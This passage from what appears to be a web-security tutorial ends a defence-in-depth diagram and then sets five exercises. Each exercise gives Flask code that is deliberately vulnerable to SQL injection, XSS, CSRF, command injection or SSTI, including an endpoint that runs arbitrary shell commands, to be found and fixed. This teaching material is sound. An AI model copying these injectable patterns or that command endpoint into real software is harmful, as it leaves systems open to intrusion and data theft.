<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Template</span><span class="w"> </span><span class="nt">data</span><span class="w"> </span><span class="nt">parameters</span><span class="w"> </span><span class="o">(</span><span class="nt">SSTI</span><span class="o">)</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">subprocess</span><span class="w"> </span><span class="nt">with</span><span class="w"> </span><span class="nt">list</span><span class="w"> </span><span class="nt">args</span><span class="w"> </span><span class="o">(</span><span class="nt">Command</span><span class="o">)</span><span class="w">                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">LDAP</span><span class="w"> </span><span class="nt">escape</span><span class="w"> </span><span class="nt">functions</span><span class="w"> </span><span class="o">(</span><span class="nt">LDAP</span><span class="o">)</span><span class="w">                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Layer</span><span class="w"> </span><span class="nt">3</span><span class="o">:</span><span class="w"> </span><span class="nt">Output</span><span class="w"> </span><span class="nt">Encoding</span><span class="w">                                        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">HTML</span><span class="w"> </span><span class="nt">entity</span><span class="w"> </span><span class="nt">encoding</span><span class="w"> </span><span class="o">(</span><span class="nt">XSS</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">HTML</span><span class="w"> </span><span class="nt">context</span><span class="o">)</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">JavaScript</span><span class="w"> </span><span class="nt">encoding</span><span class="w"> </span><span class="o">(</span><span class="nt">XSS</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">JS</span><span class="w"> </span><span class="nt">context</span><span class="o">)</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">URL</span><span class="w"> </span><span class="nt">encoding</span><span class="w"> </span><span class="o">(</span><span class="nt">XSS</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">URL</span><span class="w"> </span><span class="nt">context</span><span class="o">)</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">Context-specific</span><span class="w"> </span><span class="nt">encoding</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">each</span><span class="w"> </span><span class="nt">output</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Layer</span><span class="w"> </span><span class="nt">4</span><span class="o">:</span><span class="w"> </span><span class="nt">Security</span><span class="w"> </span><span class="nt">Headers</span><span class="w">                                       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Content-Security-Policy</span><span class="w"> </span><span class="o">(</span><span class="nt">blocks</span><span class="w"> </span><span class="nt">inline</span><span class="w"> </span><span class="nt">scripts</span><span class="o">)</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">X-Content-Type-Options</span><span class="o">:</span><span class="w"> </span><span class="nt">nosniff</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">X-Frame-Options</span><span class="o">:</span><span class="w"> </span><span class="nt">DENY</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">Set-Cookie</span><span class="o">:</span><span class="w"> </span><span class="nt">HttpOnly</span><span class="o">;</span><span class="w"> </span><span class="nt">Secure</span><span class="o">;</span><span class="w"> </span><span class="nt">SameSite</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Layer</span><span class="w"> </span><span class="nt">5</span><span class="o">:</span><span class="w"> </span><span class="nt">Runtime</span><span class="w"> </span><span class="nt">Protection</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Web</span><span class="w"> </span><span class="nt">Application</span><span class="w"> </span><span class="nt">Firewall</span><span class="w"> </span><span class="o">(</span><span class="nt">WAF</span><span class="o">)</span><span class="w">                             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Rate</span><span class="w"> </span><span class="nt">limiting</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â”œâ”€â”€</span><span class="w"> </span><span class="nt">Anomaly</span><span class="w"> </span><span class="nt">detection</span><span class="w">                                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="err">â””â”€â”€</span><span class="w"> </span><span class="nt">Security</span><span class="w"> </span><span class="nt">monitoring</span><span class="w"> </span><span class="nt">and</span><span class="w"> </span><span class="nt">alerting</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">No</span><span class="w"> </span><span class="nt">single</span><span class="w"> </span><span class="nt">layer</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">sufficient</span><span class="o">.</span><span class="w"> </span><span class="nt">Use</span><span class="w"> </span><span class="nt">ALL</span><span class="w"> </span><span class="nt">layers</span><span class="w"> </span><span class="nt">together</span><span class="o">.</span><span class="w">        </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="10-exercises">10. Exercises<a class="header-link" href="#10-exercises" title="Permanent link">&para;</a></h2>
<h3 id="exercise-1-sql-injection-lab">Exercise 1: SQL Injection Lab<a class="header-link" href="#exercise-1-sql-injection-lab" title="Permanent link">&para;</a></h3>
<p>Identify the injection vulnerability, write an exploit payload, then fix the code:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Exercise: Find the SQL injection, exploit it, then fix it.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/products&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_products</span><span class="p">():</span>
    <span class="n">category</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;category&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">min_price</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;min_price&#39;</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
    <span class="n">max_price</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;max_price&#39;</span><span class="p">,</span> <span class="s1">&#39;99999&#39;</span><span class="p">)</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;shop.db&#39;</span><span class="p">)</span>
    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        SELECT id, name, price, description</span>
<span class="s2">        FROM products</span>
<span class="s2">        WHERE category = &#39;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">&#39;</span>
<span class="s2">        AND price BETWEEN </span><span class="si">{</span><span class="n">min_price</span><span class="si">}</span><span class="s2"> AND </span><span class="si">{</span><span class="n">max_price</span><span class="si">}</span>
<span class="s2">        ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span>
<span class="s2">    &quot;&quot;&quot;</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>

<span class="c1"># Questions:</span>
<span class="c1"># 1. How many injection points are there? (Identify each)</span>
<span class="c1"># 2. Write a payload to extract all table names from the database</span>
<span class="c1"># 3. Write a payload to extract all user passwords</span>
<span class="c1"># 4. Fix the code to prevent all injection vectors</span>
</code></pre></div>

<h3 id="exercise-2-xss-challenge">Exercise 2: XSS Challenge<a class="header-link" href="#exercise-2-xss-challenge" title="Permanent link">&para;</a></h3>
<p>Fix all XSS vulnerabilities in this template and backend:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Exercise: Fix ALL XSS vulnerabilities in this blog application.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">BLOG_TEMPLATE</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">&lt;html&gt;</span>
<span class="s2">&lt;head&gt;</span>
<span class="s2">    &lt;title&gt;{{ title }}&lt;/title&gt;</span>
<span class="s2">    &lt;style&gt;</span>
<span class="s2">        .highlight { color: &quot;&quot;&quot;</span> <span class="o">+</span> <span class="s2">&quot;{{ highlight_color }}&quot;</span> <span class="o">+</span> <span class="s2">&quot;&quot;&quot;; }</span>
<span class="s2">    &lt;/style&gt;</span>
<span class="s2">&lt;/head&gt;</span>
<span class="s2">&lt;body&gt;</span>
<span class="s2">    &lt;h1&gt;Blog Post&lt;/h1&gt;</span>

<span class="s2">    &lt;!-- Search result --&gt;</span>
<span class="s2">    &lt;p&gt;Showing results for: &quot;&quot;&quot;</span> <span class="o">+</span> <span class="s2">&quot;{{ search_query }}&quot;</span> <span class="o">+</span> <span class="s2">&quot;&quot;&quot;&lt;/p&gt;</span>

<span class="s2">    &lt;!-- Post content (HTML allowed for formatting) --&gt;</span>
<span class="s2">    &lt;div class=&quot;content&quot;&gt;{{ post_content|safe }}&lt;/div&gt;</span>

<span class="s2">    &lt;!-- User comment --&gt;</span>
<span class="s2">    &lt;div class=&quot;comment&quot; data-author=&quot;{{ comment_author }}&quot;&gt;</span>
<span class="s2">        {{ comment_text }}</span>
<span class="s2">    &lt;/div&gt;</span>

<span class="s2">    &lt;!-- Share button --&gt;</span>
<span class="s2">    &lt;a href=&quot;javascript:share(&#39;{{ share_url }}&#39;)&quot;&gt;Share&lt;/a&gt;</span>

<span class="s2">    &lt;script&gt;</span>
<span class="s2">        var userName = &#39;{{ current_user }}&#39;;</span>
<span class="s2">        var searchTerm = &#39;{{ search_query }}&#39;;</span>
<span class="s2">        document.getElementById(&#39;welcome&#39;).innerHTML =</span>
<span class="s2">            &#39;Welcome, &#39; + userName;</span>
<span class="s2">    &lt;/script&gt;</span>
<span class="s2">&lt;/body&gt;</span>
<span class="s2">&lt;/html&gt;</span>
<span class="s2">&quot;&quot;&quot;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/blog&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">blog</span><span class="p">():</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">BLOG_TEMPLATE</span><span class="p">,</span>
        <span class="n">title</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;My Blog&#39;</span><span class="p">),</span>
        <span class="n">highlight_color</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;color&#39;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">),</span>
        <span class="n">search_query</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">post_content</span><span class="o">=</span><span class="n">get_post_content</span><span class="p">(),</span>  <span class="c1"># From DB, may contain user HTML</span>
        <span class="n">comment_author</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">comment_text</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;comment&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">share_url</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
        <span class="n">current_user</span><span class="o">=</span><span class="n">get_current_username</span><span class="p">(),</span>
    <span class="p">)</span>

<span class="c1"># Questions:</span>
<span class="c1"># 1. Identify ALL XSS vectors (there are at least 6)</span>
<span class="c1"># 2. For each, explain what type (reflected, stored, DOM)</span>
<span class="c1"># 3. Fix each vulnerability with the appropriate encoding</span>
<span class="c1"># 4. Add a Content Security Policy header</span>
</code></pre></div>

<h3 id="exercise-3-csrf-protection">Exercise 3: CSRF Protection<a class="header-link" href="#exercise-3-csrf-protection" title="Permanent link">&para;</a></h3>
<p>Implement complete CSRF protection for this application:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Exercise: Add CSRF protection to all state-changing endpoints.</span>
<span class="sd">Implement both token-based and SameSite cookie protection.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;change-me&#39;</span>

<span class="c1"># These endpoints need CSRF protection:</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/transfer&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">transfer_money</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Transfer money between accounts.&quot;&quot;&quot;</span>
    <span class="n">from_account</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span>
    <span class="n">to_account</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span>
    <span class="n">amount</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;amount&#39;</span><span class="p">]</span>
    <span class="c1"># TODO: Add CSRF protection</span>
    <span class="k">return</span> <span class="n">do_transfer</span><span class="p">(</span><span class="n">from_account</span><span class="p">,</span> <span class="n">to_account</span><span class="p">,</span> <span class="n">amount</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;PUT&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">update_profile</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Update user profile via AJAX.&quot;&quot;&quot;</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span>
    <span class="c1"># TODO: Add CSRF protection for AJAX requests</span>
    <span class="k">return</span> <span class="n">update_user_profile</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/delete-account&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;DELETE&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">delete_account</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Permanently delete user account.&quot;&quot;&quot;</span>
    <span class="c1"># TODO: Add CSRF protection + additional confirmation</span>
    <span class="k">return</span> <span class="n">delete_user_account</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">])</span>

<span class="c1"># Requirements:</span>
<span class="c1"># 1. Implement csrf_protect decorator</span>
<span class="c1"># 2. Generate and validate CSRF tokens</span>
<span class="c1"># 3. Handle both form submissions and AJAX requests</span>
<span class="c1"># 4. Configure SameSite cookies</span>
<span class="c1"># 5. Add token to all forms and AJAX calls</span>
</code></pre></div>

<h3 id="exercise-4-command-injection-prevention">Exercise 4: Command Injection Prevention<a class="header-link" href="#exercise-4-command-injection-prevention" title="Permanent link">&para;</a></h3>
<p>Rewrite this file management API to be injection-safe:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Exercise: Rewrite ALL endpoints to prevent command injection.</span>
<span class="sd">Use Python libraries instead of shell commands where possible.</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/list&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">list_files</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;ls -la </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;files&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_files</span><span class="p">():</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;pattern&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;find </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1"> -name &quot;</span><span class="si">{</span><span class="n">pattern</span><span class="si">}</span><span class="s1">&quot;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;results&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/files/compress&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">compress</span><span class="p">():</span>
    <span class="n">files</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">,</span> <span class="p">[])</span>
    <span class="n">output_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;output&#39;</span><span class="p">,</span> <span class="s1">&#39;archive.tar.gz&#39;</span><span class="p">)</span>
    <span class="n">file_list</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">files</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tar czf </span><span class="si">{</span><span class="n">output_name</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">file_list</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;compressed&quot;</span><span class="p">})</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/system/info&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">system_info</span><span class="p">():</span>
    <span class="n">command</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;cmd&#39;</span><span class="p">,</span> <span class="s1">&#39;uname -a&#39;</span><span class="p">)</span>
    <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;output&quot;</span><span class="p">:</span> <span class="n">output</span><span class="p">})</span>

<span class="c1"># Requirements:</span>
<span class="c1"># 1. Replace shell commands with Python equivalents</span>
<span class="c1"># 2. Add input validation for all parameters</span>
<span class="c1"># 3. Prevent path traversal attacks</span>
<span class="c1"># 4. Remove the system_info endpoint entirely (it&#39;s a backdoor!)</span>
</code></pre></div>

<h3 id="exercise-5-full-application-security-review">Exercise 5: Full Application Security Review<a class="header-link" href="#exercise-5-full-application-security-review" title="Permanent link">&para;</a></h3>
<p>Perform a security review on this application and fix all injection vulnerabilities:</p>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">Exercise: This application has at least one vulnerability from each</span>
<span class="sd">injection type covered in this lesson:</span>
<span class="sd">- SQL Injection</span>
<span class="sd">- XSS (Reflected and Stored)</span>
<span class="sd">- CSRF</span>
<span class="sd">- Command Injection</span>
<span class="sd">- SSTI</span>

<span class="sd">Find and fix ALL of them. Add defense-in-depth measures including</span>
<span class="sd">CSP headers.</span>
<span class="sd">&quot;&quot;&quot;</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sqlite3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;dev-key&#39;</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
    <span class="n">q</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;SELECT * FROM articles WHERE title LIKE &#39;%</span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">%&#39;&quot;</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span>
        <span class="sa">f</span><span class="s2">&quot;&lt;h1&gt;Results for: </span><span class="si">{</span><span class="n">q</span><span class="si">}</span><span class="s2">&lt;/h1&gt;&quot;</span> <span class="o">+</span>
        <span class="s2">&quot;&lt;ul&gt;{</span><span class="si">% f</span><span class="s2">or r in results %}&lt;li&gt;{{ r[1] }}&lt;/li&gt;{</span><span class="si">% e</span><span class="s2">ndfor %}&lt;/ul&gt;&quot;</span><span class="p">,</span>
        <span class="n">results</span><span class="o">=</span><span class="n">results</span>
    <span class="p">)</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comment&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment</span><span class="p">():</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span>
    <span class="n">db</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s1">&#39;app.db&#39;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;INSERT INTO comments (text) VALUES (&#39;</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="s2">&quot;Comment added&quot;</span>

